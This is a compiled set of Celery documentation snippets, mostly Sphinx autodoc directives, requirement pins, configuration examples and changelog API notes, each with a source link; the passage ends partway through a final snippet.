Documentation Using Sphinx-Click in reStructuredText\nDESCRIPTION: This snippet uses the .. click:: Sphinx extension directive to automatically generate Celery CLI documentation within reStructuredText files. It targets the celery.bin.celery:celery command object, generates full nested subcommand documentation, and sets the command program name to \\'celery\\'. This requires Sphinx with the sphinx-click extension and Celery installed; code is included in a reStructuredText (.rst) file and outputs rendered CLI documentation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/cli.rst#2025-04-23_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. click:: celery.bin.celery:celery\n   :prog: celery\n   :nested: full\n```\n\n----------------------------------------\n\nTITLE: Defining Python Dependency Version for Cassandra Driver\nDESCRIPTION: Specifies the `cassandra-driver` Python package as a project dependency. It mandates a version greater than or equal to 3.25.0 and strictly less than 4.0.0. This format is commonly used in files like `requirements.txt` and interpreted by package managers like pip to install the appropriate library version.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/cassandra.txt#2025-04-23_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\ncassandra-driver>=3.25.0,<4\n```\n\n----------------------------------------\n\nTITLE: Redis SSL URI Configuration\nDESCRIPTION: Example of configuring Redis broker SSL connection using URI parameters including keyfile, certificate, CA certificates and cert requirements\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.3.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nrediss://localhost:3456?ssl_keyfile=keyfile.key&ssl_certfile=certificate.crt&ssl_ca_certs=ca.pem&ssl_cert_reqs=CERT_REQUIRED\n```\n\n----------------------------------------\n\nTITLE: Including External reStructuredText Files\nDESCRIPTION: These reStructuredText directives (`.. include::`) incorporate the content of external `.txt` files (presumably containing reStructuredText markup) into the current document at the point of inclusion. This modularizes the documentation by separating introduction, installation, and resource information.\nSOURCE: https://github.com/celery/celery/blob/main/docs/templates/readme.txt#2025-04-23_snippet_6\n\nLANGUAGE: rst\nCODE:\n```\n.. include:: ../includes/introduction.txt\n\n.. include:: ../includes/installation.txt\n\n.. include:: ../includes/resources.txt\n```\n\n----------------------------------------\n\nTITLE: Generating Local Table of Contents using Sphinx RST\nDESCRIPTION: This reStructuredText snippet uses the Sphinx `contents` directive with the `:local:` option. Its purpose is to automatically generate a table of contents that lists the subsections within the current document scope, aiding navigation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.worker.consumer.tasks.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. contents::\n    :local:\n```\n\n----------------------------------------\n\nTITLE: Timer Implementation Using heapq Module\nDESCRIPTION: The timer component uses Python's heapq module to efficiently schedule internal functions. This implementation can manage hundreds of thousands of entries in the scheduling queue.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/worker.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nimport heapq\n```\n\n----------------------------------------\n\nTITLE: Generating Local Table of Contents with Sphinx\nDESCRIPTION: Uses the Sphinx `.. contents::` directive with the `:local:` option to generate a table of contents specific to the current section or file within the generated documentation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.bin.call.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. contents::\n    :local:\n```\n\n----------------------------------------\n\nTITLE: Accessing Subtask IDs from TaskSetResult (Python)\nDESCRIPTION: Illustrates the method introduced in Celery 0.3.20 to retrieve subtask IDs from a `TaskSetResult` object (`ts_res`) using a list comprehension, replacing the previously removed `subtask_ids` attribute.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_16\n\nLANGUAGE: python\nCODE:\n```\n>>> subtask_ids = [subtask.id for subtask in ts_res.subtasks]\n```\n\n----------------------------------------\n\nTITLE: RST Directive for Celery Events Documentation\nDESCRIPTION: ReStructuredText directives that set up the documentation page for the celery.app.events module. It includes table of contents, sets the current module context, and configures autodoc settings to document all module members.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.app.events.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n================================\n ``celery.app.events``\n================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.app.events\n\n.. automodule:: celery.app.events\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for Elasticsearch Backend\nDESCRIPTION: ReStructuredText documentation structure defining the layout and automodule inclusion for the Celery Elasticsearch backend documentation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.backends.elasticsearch.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n===========================================\n ``celery.backends.elasticsearch``\n===========================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.backends.elasticsearch\n\n.. automodule:: celery.backends.elasticsearch\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Defining Sphinx Documentation Structure for Celery Worker Module\nDESCRIPTION: ReStructuredText directives defining the documentation structure for the celery.apps.worker module. Sets up table of contents, current module context, and auto-documentation settings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.apps.worker.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n=======================================\n ``celery.apps.worker``\n=======================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.apps.worker\n\n.. automodule:: celery.apps.worker\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Declaring pylibmc Dependency with Platform Constraint in Requirements File\nDESCRIPTION: This snippet specifies the pylibmc package version 1.6.3 as a dependency, but excludes installation on Windows platforms by using an environment marker. This is typically used in a Python requirements.txt file for pip. The snippet has no required code dependencies beyond pip and uses standard environment markers to manage cross-platform package compatibility. The key parameter is the version specifier and the platform marker, which restricts installation context.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/memcache.txt#2025-04-23_snippet_0\n\nLANGUAGE: other\nCODE:\n```\npylibmc==1.6.3; platform_system != \"Windows\"\n```\n\n----------------------------------------\n\nTITLE: ReStructuredText Module Documentation Header\nDESCRIPTION: Sets up the documentation structure for the celery.apps.multi module using reStructuredText directives for auto-documentation generation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.apps.multi.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n=======================================\n ``celery.apps.multi``\n=======================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.apps.multi\n\n.. automodule:: celery.apps.multi\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Documenting celery.security with Sphinx (reStructuredText)\nDESCRIPTION: This snippet uses reStructuredText and Sphinx directives to generate structured documentation for the celery.security Python module. It includes navigation for local contents, sets the documentation namespace to celery.security, and invokes the automodule directive to include both documented and undocumented members of the module. It requires Sphinx and assumes the celery.security module is properly installed and importable in the documentation build environment. The output is a navigable technical reference of the module within generated HTML or PDF docs.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.security.rst#2025-04-23_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n========================\n ``celery.security``\n========================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.security\n\n.. automodule:: celery.security\n    :members:\n    :undoc-members:\n\n```\n\n----------------------------------------\n\nTITLE: Breaking the App Chain - Bad Practice Example\nDESCRIPTION: Shows an example of bad practice in Celery where the current_app is used directly within a class, breaking the app chain.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_17\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import current_app\n\nclass Scheduler:\n\n    def run(self):\n        app = current_app\n```\n\n----------------------------------------\n\nTITLE: RST Module Documentation Structure\nDESCRIPTION: ReStructuredText documentation format defining the structure for the celery.utils.saferepr module documentation. Includes section headers, table of contents directive, and automodule directive for generating API documentation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.saferepr.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n===========================================\n ``celery.utils.saferepr``\n===========================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.utils.saferepr\n\n.. automodule:: celery.utils.saferepr\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Configuring Sphinx Documentation for Celery Abstract Utils\nDESCRIPTION: ReStructuredText directives for configuring Sphinx documentation of the celery.utils.abstract module. Sets up the table of contents, current module context, and documentation extraction parameters.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.abstract.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. contents::\n    :local:\n.. currentmodule:: celery.utils.abstract\n\n.. automodule:: celery.utils.abstract\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Registering Celery Tasks API Change (Python)\nDESCRIPTION: Shows the API change for registering tasks in Celery 0.3.7. The `task_name` argument in `tasks.register` was renamed to `name`. The snippet contrasts the old and new usage.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_18\n\nLANGUAGE: python\nCODE:\n```\n>>> tasks.register(func, task_name='mytask')\n```\n\nLANGUAGE: python\nCODE:\n```\n>>> tasks.register(func, name='mytask')\n```\n\n----------------------------------------\n\nTITLE: Configuring Sphinx Documentation for Celery Beat Module\nDESCRIPTION: ReStructuredText directives for configuring Sphinx documentation of the celery.beat module, including table of contents and module reference settings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.beat.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n.. contents::\n    :local:\n.. currentmodule:: celery.beat\n\n.. automodule:: celery.beat\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Auto-Documenting Python Module Members (reStructuredText)\nDESCRIPTION: This reStructuredText directive uses the Sphinx autodoc extension to automatically generate documentation for the specified Python module, `celery.bin.list`. The `:members:` option instructs autodoc to include documentation for all public members (functions, classes, variables) found within the module. The `:undoc-members:` option further ensures that members without docstrings are also listed.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.bin.list.rst#2025-04-23_snippet_2\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. automodule:: celery.bin.list\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Configuring Old Celery Custom Carrot Backend (Pre-v0.8.1) in Python\nDESCRIPTION: This configuration snippet illustrates the older method (before Celery v0.8.1) for specifying a custom Carrot messaging backend. It only required the Python module path containing the backend implementation, implicitly assuming the class name was 'Backend'.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\nCARROT_BACKEND = 'mycustom.backend.module'\n```\n\n----------------------------------------\n\nTITLE: Declaring Minimum pyzmq Version Requirement\nDESCRIPTION: This line specifies that the project requires the 'pyzmq' Python package (Python bindings for ZeroMQ) to be installed, and its version must be greater than or equal to 22.3.0. This is typically found in a requirements file (like requirements.txt) and used by package installers like pip.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/zeromq.txt#2025-04-23_snippet_0\n\nLANGUAGE: text\nCODE:\n```\npyzmq>=22.3.0\n```\n\n----------------------------------------\n\nTITLE: Setting Current Module Context in Sphinx (reStructuredText)\nDESCRIPTION: This Sphinx directive sets the default module for subsequent documentation generation to `celery.bin.events`. This allows shorter references to classes and functions within this module in later directives. Requires the Sphinx documentation generator to be processed.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.bin.events.rst#2025-04-23_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n.. currentmodule:: celery.bin.events\n```\n\n----------------------------------------\n\nTITLE: Sphinx Directives for Module Documentation Generation\nDESCRIPTION: These are reStructuredText directives used by the Sphinx documentation generator. `.. contents:: :local:` creates a local table of contents. `.. currentmodule:: celery.worker.consumer` sets the default module for subsequent directives. `.. automodule:: celery.worker.consumer :members: :undoc-members:` instructs Sphinx to automatically document the specified Python module, including all its members and even those without explicit docstrings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.worker.consumer.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. contents::\n    :local:\n.. currentmodule:: celery.worker.consumer\n\n.. automodule:: celery.worker.consumer\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery Migration Documentation Page - reStructuredText\nDESCRIPTION: This snippet uses reStructuredText and Sphinx directives to create a documentation page for the celery.bin.migrate module. It organizes local contents, sets the context module, and uses automodule to include all (including undocumented) members of the module in the generated documentation. The snippet requires Sphinx and the autodoc extension to process the directives, and is intended for use in Celery's documentation build process.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.bin.migrate.rst#2025-04-23_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n=====================================================\n ``celery.bin.migrate``\n=====================================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.bin.migrate\n\n.. automodule:: celery.bin.migrate\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Deleting Exchange in RabbitMQ via Console Command\nDESCRIPTION: Console command to delete the 'celeryresults' exchange in RabbitMQ using camqadm. This is required due to changes in RabbitMQ 1.8.0 exchange equivalence tests.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ camqadm exchange.delete celeryresults\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for Celery Task Module\nDESCRIPTION: ReStructuredText documentation file that defines the structure for documenting the celery.app.task module. It includes a table of contents and automodule directive to document Task, Context and TaskType members.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.app.task.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n===================================\n ``celery.app.task``\n===================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.app.task\n\n.. automodule:: celery.app.task\n    :members: Task, Context, TaskType\n```\n\n----------------------------------------\n\nTITLE: Sphinx Autodoc Configuration for celery.worker.consumer.events\nDESCRIPTION: This snippet uses Sphinx reStructuredText directives to configure the automatic generation of documentation for the `celery.worker.consumer.events` Python module. It includes a local table of contents (`.. contents::`), sets the current module context (`.. currentmodule::`), and uses `.. automodule::` to import and document all members (including `undoc-members`) from the specified module.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.worker.consumer.events.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. contents::\n    :local:\n.. currentmodule:: celery.worker.consumer.events\n\n.. automodule:: celery.worker.consumer.events\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Deleting Exchange in RabbitMQ via Django Management Command\nDESCRIPTION: Django management command to delete the 'celeryresults' exchange in RabbitMQ. Alternative method to the direct console command.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n$ python manage.py camqadm exchange.delete celeryresults\n```\n\n----------------------------------------\n\nTITLE: Worker Node Configuration\nDESCRIPTION: Shows how to configure unique worker node names for proper broadcast command handling\nSOURCE: https://github.com/celery/celery/blob/main/docs/faq.rst#2025-04-23_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\n$ celery -A proj worker -n worker1@%h\n$ celery -A proj worker -n worker2@%h\n```\n\n----------------------------------------\n\nTITLE: Documenting celery.utils.collections Module in Python\nDESCRIPTION: This snippet uses Sphinx documentation syntax to generate documentation for the celery.utils.collections module. It sets the current module, includes a table of contents, and uses automodule to document all members and undocumented members of the module.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.collections.rst#2025-04-23_snippet_0\n\nLANGUAGE: Python\nCODE:\n```\n.. currentmodule:: celery.utils.collections\n\n.. contents::\n    :local:\n\n.. automodule:: celery.utils.collections\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Specifying Project Requirements for Celery (requirements.txt) - Plain Text\nDESCRIPTION: This requirements file directs Python dependency managers to install both standard and auxiliary dependencies for the Celery project. It includes references to other requirement files using '-r' for modular dependency management, specifies minimum version constraints for certain packages like pytest-rerunfailures, and sources the Kombu library directly from a remote GitHub repository using a git+ URL. The file is meant to be used with tools like pip to bootstrap and maintain an isolated Python environment for Celery, and assumes 'pip' or a compatible manager is available. The '-r' directives recursively include additional dependencies from specified extras files, while all other lines denote packages to install directly.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/test-integration.txt#2025-04-23_snippet_0\n\nLANGUAGE: plain text\nCODE:\n```\n-r extras/redis.txt\n-r extras/azureblockblob.txt\n-r extras/auth.txt\n-r extras/memcache.txt\npytest-rerunfailures>=11.1.2\ngit+https://github.com/celery/kombu.git\n```\n\n----------------------------------------\n\nTITLE: Auto-documenting Python Module with Sphinx (reStructuredText)\nDESCRIPTION: This Sphinx directive `.. automodule::` automatically imports the specified Python module (`celery.contrib.pytest`) and generates documentation by introspecting its contents and extracting docstrings. The `:members:` option instructs Sphinx to include documentation for all public members (functions, classes, variables) within the module. The `:undoc-members:` option further extends this to include members that do not have explicit docstrings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.contrib.pytest.rst#2025-04-23_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n.. automodule:: celery.contrib.pytest\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Altering MySQL Table for NULL Result\nDESCRIPTION: SQL command to modify the 'celery_taskmeta' table in MySQL to allow NULL values in the result column. Required due to changes in django-picklefield.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nALTER TABLE celery_taskmeta MODIFY result TEXT NULL\n```\n\n----------------------------------------\n\nTITLE: Generating Celery Test Coverage Report (Console)\nDESCRIPTION: Demonstrates running Celery tests with `nosetests` and the `--with-coverage3` flag to generate an HTML code coverage report. The report indicates which parts of the codebase were exercised by the tests and is saved to `celery/tests/cover/index.html`. Requires the `coverage` package (specifically version 3 compatible plugin for nosetests).\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_17\n\nLANGUAGE: console\nCODE:\n```\n$ nosetests --with-coverage3\n```\n\n----------------------------------------\n\nTITLE: Loading Celery Configuration from an Environment Variable in Python\nDESCRIPTION: Illustrates configuring a Celery application from a module specified in an environment variable using config_from_envvar. The os.environ.setdefault call ensures a default. Dependencies: must have the specified configuration module present and valid in the Python path (e.g., 'celeryconfig'). Useful in containerized or staged environments to switch config context dynamically.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\nimport os\nfrom celery import Celery\n\n#: Set default configuration module name\nos.environ.setdefault('CELERY_CONFIG_MODULE', 'celeryconfig')\n\napp = Celery()\napp.config_from_envvar('CELERY_CONFIG_MODULE')\n```\n\n----------------------------------------\n\nTITLE: Generating Local Table of Contents with Sphinx\nDESCRIPTION: A Sphinx directive used to automatically generate a table of contents specific to the local section or document where it's placed.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.sysinfo.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. contents::\n    :local:\n```\n\n----------------------------------------\n\nTITLE: Documenting Celery Utils Module with reStructuredText\nDESCRIPTION: This snippet uses reStructuredText directives to set up the documentation structure for the celery.utils module. It includes a title, table of contents, sets the current module, and uses automodule to generate comprehensive documentation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.rst#2025-04-23_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n==========================\n ``celery.utils``\n==========================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.utils\n\n.. automodule:: celery.utils\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: RestructuredText Documentation Header for CouchDB Backend\nDESCRIPTION: Sphinx documentation structure defining the module documentation for Celery's CouchDB backend, including table of contents and module reference directives.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.backends.couchdb.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n===========================================\n ``celery.backends.couchdb``\n===========================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.backends.couchdb\n\n.. automodule:: celery.backends.couchdb\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Celery Glossary Definition in reStructuredText\nDESCRIPTION: ReStructuredText markup defining a sorted glossary of Celery-specific terms, including acknowledgment types, task execution concepts, and technical terminology.\nSOURCE: https://github.com/celery/celery/blob/main/docs/glossary.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n.. _glossary:\\n\\nGlossary\\n========\\n\\n.. glossary::\\n    :sorted:\\n\\n    acknowledged\\n        Workers acknowledge messages to signify that a message has been\\n        handled. Failing to acknowledge a message\\n        will cause the message to be redelivered. Exactly when a\\n        transaction is considered a failure varies by transport. In AMQP the\\n        transaction fails when the connection/channel is closed (or lost),\\n        but in Redis/SQS the transaction times out after a configurable amount\\n        of time (the ``visibility_timeout``).\n```\n\n----------------------------------------\n\nTITLE: AMQP Class Documentation in RST\nDESCRIPTION: RestructuredText documentation for the AMQP class including attributes and methods related to message broker configuration.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.app.amqp.rst#2025-04-23_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n.. autoclass:: AMQP\n\n        .. attribute:: Connection\n\n            Broker connection class used. Default is :class:`kombu.Connection`.\n\n        .. attribute:: Consumer\n\n            Base Consumer class used. Default is :class:`kombu.Consumer`.\n\n        .. attribute:: Producer\n\n            Base Producer class used. Default is :class:`kombu.Producer`.\n\n        .. attribute:: queues\n\n            All currently defined task queues (a :class:`Queues` instance).\n\n        .. attribute:: argsrepr_maxsize\n\n            Max size of positional argument representation used for logging\n            purposes. Default is 1024.\n\n        .. attribute:: kwargsrepr_maxsize\n\n            Max size of keyword argument representation used for logging\n            purposes. Default is 1024.\n```\n\n----------------------------------------\n\nTITLE: Installing Couchbase Backend Dependencies\nDESCRIPTION: Command to install Couchbase dependencies for Celery\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_32\n\nLANGUAGE: console\nCODE:\n```\n$ pip install celery[couchbase]\n```\n\n----------------------------------------\n\nTITLE: Defining reStructuredText Substitution for Build Status Badge\nDESCRIPTION: This reStructuredText substitution definition defines a shortcut named 'build-status'. When '|build-status|' is used in the document, it will be replaced by an image directive pointing to the Travis CI build status image for the Celery project's main branch. The image also acts as a hyperlink to the corresponding Travis CI build page.\nSOURCE: https://github.com/celery/celery/blob/main/docs/templates/readme.txt#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. |build-status| image:: https://secure.travis-ci.org/celery/celery.png?branch=main\n    :alt: Build status\n    :target: https://travis-ci.org/celery/celery\n```\n\n----------------------------------------\n\nTITLE: Generating Documentation for celery.contrib.rdb using Sphinx\nDESCRIPTION: These reStructuredText snippets employ Sphinx directives to automatically generate documentation for the `celery.contrib.rdb` Python module. `.. currentmodule::` sets the context, `.. automodule::` instructs Sphinx to document the module, while `.. autofunction::` and `.. autoclass::` target specific functions (`set_trace`, `debugger`) and the `Rdb` class for documentation generation. These directives are used within a Sphinx project to build API reference documentation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.contrib.rdb.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. currentmodule:: celery.contrib.rdb\n```\n\nLANGUAGE: rst\nCODE:\n```\n.. automodule:: celery.contrib.rdb\n```\n\nLANGUAGE: rst\nCODE:\n```\n    .. autofunction:: set_trace\n```\n\nLANGUAGE: rst\nCODE:\n```\n    .. autofunction:: debugger\n```\n\nLANGUAGE: rst\nCODE:\n```\n    .. autoclass:: Rdb\n```\n\n----------------------------------------\n\nTITLE: Exposing a Whitelisted Task Endpoint via Dedicated View - Shell\nDESCRIPTION: This curl command demonstrates invoking a dedicated Django view ('views.ping') that applies a single Celery task with a whitelisted interface for increased security. Prerequisite is that the /ping/ endpoint and associated view have been defined in Django to apply the ping task only. Output is JSON containing the task result and status.\nSOURCE: https://github.com/celery/celery/blob/main/examples/celery_http_gateway/README.rst#2025-04-23_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ curl http://localhost:8000/ping/\n{\"ok\": \"true\", \"task_id\": \"383c902c-ba07-436b-b0f3-ea09cc22107c\"}\n```\n\n----------------------------------------\n\nTITLE: Documentation Structure for Celery Worker Loops\nDESCRIPTION: ReStructuredText documentation template that defines the structure for the celery.worker.loops module documentation. It includes a table of contents, module reference, and automodule directive for generating comprehensive API documentation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.worker.loops.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n====================================\n ``celery.worker.loops``\n====================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.worker.loops\n\n.. automodule:: celery.worker.loops\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Installing ArangoDB Backend Dependencies\nDESCRIPTION: Command to install ArangoDB dependencies for Celery\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_34\n\nLANGUAGE: console\nCODE:\n```\n$ pip install celery[arangodb]\n```\n\n----------------------------------------\n\nTITLE: Auto-documenting a Python Module with Sphinx\nDESCRIPTION: This Sphinx `automodule` directive automatically pulls documentation from the specified Python module (`celery.contrib.abortable`). The `:members:` option instructs Sphinx to include documentation for all public members (functions, classes, variables) defined within the module. The `:undoc-members:` option further extends this to include members that do not have explicit docstrings, ensuring comprehensive coverage.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.contrib.abortable.rst#2025-04-23_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n.. automodule:: celery.contrib.abortable\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: AMQP Methods Documentation in RST\nDESCRIPTION: RestructuredText directives for auto-documenting AMQP class methods and attributes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.app.amqp.rst#2025-04-23_snippet_3\n\nLANGUAGE: rst\nCODE:\n```\n        .. automethod:: Queues\n        .. automethod:: Router\n        .. automethod:: flush_routes\n\n        .. autoattribute:: create_task_message\n        .. autoattribute:: send_task_message\n        .. autoattribute:: default_queue\n        .. autoattribute:: default_exchange\n        .. autoattribute:: producer_pool\n        .. autoattribute:: router\n        .. autoattribute:: routes\n```\n\n----------------------------------------\n\nTITLE: Defining Conditional eventlet Dependency for Python < 3.10 (Requirements)\nDESCRIPTION: This line specifies a dependency requirement for a Python project, typically used in files like `requirements.txt` or build configurations (e.g., `setup.py`, `setup.cfg`). It instructs the package installer (like pip) to install the `eventlet` package at version 0.32.0 or higher, but only if the executing Python interpreter's version is less than 3.10. This mechanism ensures compatibility by managing dependencies that may vary across different Python versions.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/eventlet.txt#2025-04-23_snippet_0\n\nLANGUAGE: requirements\nCODE:\n```\neventlet>=0.32.0; python_version<\"3.10\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Sphinx Documentation for Celery Builtins\nDESCRIPTION: ReStructuredText directives for setting up module documentation. Includes table of contents configuration, module reference, and member documentation settings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.app.builtins.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. contents::\n    :local:\n.. currentmodule:: celery.app.builtins\n\n.. automodule:: celery.app.builtins\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Configuring Sphinx Documentation for Celery Autoscale Module\nDESCRIPTION: ReStructuredText directives that set up documentation for the celery.worker.autoscale module. Includes table of contents, current module declaration, and automodule directive to generate API documentation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.worker.autoscale.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n.. contents::\n    :local:\n.. currentmodule:: celery.worker.autoscale\n\n.. automodule:: celery.worker.autoscale\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: ReStructuredText Module Documentation Declaration\nDESCRIPTION: Sphinx documentation configuration for the celery.app.utils module, including table of contents and module autoloading directives\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.app.utils.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n================================\n ``celery.app.utils``\n================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.app.utils\n\n.. automodule:: celery.app.utils\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Conditional Dependency Specification for pyro4 in Requirements\nDESCRIPTION: This line defines a conditional dependency for the 'pyro4' library. It ensures that version 4.82 of 'pyro4' is installed only when the executing Python interpreter version is less than 3.11. This syntax is commonly used in Python project dependency files like `requirements.txt` managed by pip.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/pyro.txt#2025-04-23_snippet_0\n\nLANGUAGE: requirements\nCODE:\n```\npyro4==4.82; python_version < '3.11'\n```\n\n----------------------------------------\n\nTITLE: Documenting Celery App Module Structure in RST\nDESCRIPTION: RestructuredText documentation defining the structure and contents of the celery.app module documentation, including section headers for proxies and functions with auto-documentation directives.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.app.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n.. currentmodule:: celery.app\n\n.. automodule:: 